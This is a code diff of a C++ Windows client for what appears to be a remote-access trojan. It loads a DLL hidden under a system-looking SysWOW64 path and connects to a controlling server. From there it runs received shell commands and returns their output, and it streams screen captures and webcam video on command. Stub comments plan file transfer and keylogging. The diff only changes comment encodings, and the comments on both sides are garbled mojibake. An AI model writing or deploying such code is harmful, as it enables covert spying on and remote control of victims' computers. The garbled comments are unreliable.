@@ -1,20 +1,19 @@
-// client.cpp : Defines the entry point for the console application.
-//
+/*è¢«ç›£æ§ç«¯*/ 
 
 #include "stdafx.h"
 #include "client.h"
-void exeCmd(const char*, int); //°õ¦æcommand line«ü¥O
+void exeCmd(const char*, int); //åŸ·è¡Œcommand lineæŒ‡ä»¤
 
 int _tmain(int argc, _TCHAR* argv[])
 {
-	const char* DllName = "C:\\Windows\\SysWOW64\\networktlist\\dll_opencv.dll"; //´ú¸Õ®É¥i§ï¬°·í«e¸ô®|
+	const char* DllName = "C:\\Windows\\SysWOW64\\networktlist\\dll_opencv.dll"; //æ¸¬è©¦æ™‚å¯æ”¹ç‚ºç•¶å‰è·¯å¾‘
 	//const char* DllName = "dll_opencv.dll";
 	//get dll handle
 	//printf("%s\n",path);
-	HMODULE dll_opencv = LoadLibraryA(DllName); //¸ü¤J°ÊºA³sµ²®w
+	HMODULE dll_opencv = LoadLibraryA(DllName); //è¼‰å…¥å‹•æ…‹é€£çµåº«
 	typedef void (*video_monitor)(SOCKET);
 	typedef void (*screen_monitor)(SOCKET);
-	//get function address and ¸ÑªRdllÀò¨úªº¨ç¦¡
+	//get function address and è§£ædllç²å–çš„å‡½å¼
 	video_monitor vm=NULL;
 	screen_monitor sm=NULL;
 	if (dll_opencv != NULL) {
@@ -24,7 +23,7 @@ int _tmain(int argc, _TCHAR* argv[])
 	else {
 		printf("exit1\n");
 	}
-    //³]©wwinsocketªº«e¸m§@·~
+    //è¨­å®šwinsocketçš„å‰ç½®ä½œæ¥­
     WORD version;
     WSADATA wsaData;
 
@@ -40,7 +39,7 @@ int _tmain(int argc, _TCHAR* argv[])
         WSACleanup();
         return 1;
     }
-    else { //socket³]¸m¦¨¥\
+    else { //socketè¨­ç½®æˆåŠŸ
         SOCKET fd = socket(AF_INET, SOCK_STREAM, 0);
         struct sockaddr_in srv;
         srv.sin_family = AF_INET;
@@ -59,41 +58,41 @@ int _tmain(int argc, _TCHAR* argv[])
             {
                 char command[1000]="";
                 int len;
-                int rbytes = recv(fd, (char*)&len, sizeof(int), 0); //±µ¦¬«ü¥Oªø«×
+                int rbytes = recv(fd, (char*)&len, sizeof(int), 0); //æ¥æ”¶æŒ‡ä»¤é•·åº¦
                 if (rbytes < 0) break;
-                recv(fd, command, 1000, 0); //±µ¦¬«ü¥O
+                recv(fd, command, 1000, 0); //æ¥æ”¶æŒ‡ä»¤
                 command[len] = '\0';
-                if (!strcmp(command, "exit")) break; //Â_¶}»P¦øªA¾¹ªº³s½u
-                if (!strcmp(command,"screen")) { //¿Ã¹õºI¹Ï
+                if (!strcmp(command, "exit")) break; //æ–·é–‹èˆ‡ä¼ºæœå™¨çš„é€£ç·š
+                if (!strcmp(command,"screen")) { //è¢å¹•æˆªåœ–
 					u_long iMode = 1;
 					int iResult = ioctlsocket(fd, FIONBIO, &iMode);
 
 					if (iResult != NO_ERROR) printf("ioctlsocket failed with error: %ld\n", iResult);
-					sm(fd); //°ÊºA³sµ²®wªº¨ç¦¡ ³B²z¿Ã¹õºI¹ÏµøÀW¨Ã±N¤§¶Ç°eµ¹¦øªA¾¹ºİ
-                    //socket«ì´_¦¨blocking
+					sm(fd); //å‹•æ…‹é€£çµåº«çš„å‡½å¼ è™•ç†è¢å¹•æˆªåœ–è¦–é »ä¸¦å°‡ä¹‹å‚³é€çµ¦ä¼ºæœå™¨ç«¯
+                    //socketæ¢å¾©æˆblocking
 					iMode = 0;
 					iResult = ioctlsocket(fd, FIONBIO, &iMode);
 					if (iResult != NO_ERROR) printf("ioctlsocket failed with error: %ld\n", iResult);
                 }
-                else if(!strcmp(command,"monitor")){ //¶Ç°e¬Û¾÷µøÀW
+                else if(!strcmp(command,"monitor")){ //å‚³é€ç›¸æ©Ÿè¦–é »
                     //blocking -> nonblocking
                     u_long iMode = 1;
                     int iResult = ioctlsocket(fd, FIONBIO, &iMode);
 
                     if (iResult != NO_ERROR) printf("ioctlsocket failed with error: %ld\n", iResult);
-                    vm(fd); //°ÊºA³sµ²®wªº¨ç¦¡ ³B²z¬Û¾÷µøÀW¨Ã±N¤§¶Ç°eµ¹¦øªA¾¹ºİ
-                    //socket«ì´_¦¨blocking
+                    vm(fd); //å‹•æ…‹é€£çµåº«çš„å‡½å¼ è™•ç†ç›¸æ©Ÿè¦–é »ä¸¦å°‡ä¹‹å‚³é€çµ¦ä¼ºæœå™¨ç«¯
+                    //socketæ¢å¾©æˆblocking
                     iMode = 0;
                     iResult = ioctlsocket(fd, FIONBIO, &iMode);
                     if (iResult != NO_ERROR) printf("ioctlsocket failed with error: %ld\n", iResult);
                 }
 				else{
-					printf("%s\n",command); //debug¥Î
+					printf("%s\n",command); //debugç”¨
                     exeCmd(command, fd); //excute command and send output to server
                     printf("end command\n"); //debug
 				}
-				//else if(«ü¥O){ ³B²zÀÉ®×¶Ç¿é }
-				//else if(«ü¥O){ Áä½L°¼¿ı }
+				//else if(æŒ‡ä»¤){ è™•ç†æª”æ¡ˆå‚³è¼¸ }
+				//else if(æŒ‡ä»¤){ éµç›¤å´éŒ„ }
             }
             WSACleanup();
             system("pause");
